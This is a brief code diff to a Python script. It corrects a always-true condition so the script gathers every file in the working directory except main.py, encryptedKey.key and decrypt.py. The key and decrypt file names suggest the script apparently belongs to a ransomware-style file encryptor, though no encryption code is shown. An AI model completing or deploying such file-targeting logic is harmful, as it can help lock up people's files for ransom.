@@ -9,7 +9,7 @@ with open("encryptedKey.key", "wb") as encryptedKey:
 files = []
 
 for path in os.listdir():
-    if (path == "main.py" or path == "encryptedKey.key" or "decrypt.py"):
+    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
         continue
     if os.path.isfile(path):
         files.append(path)
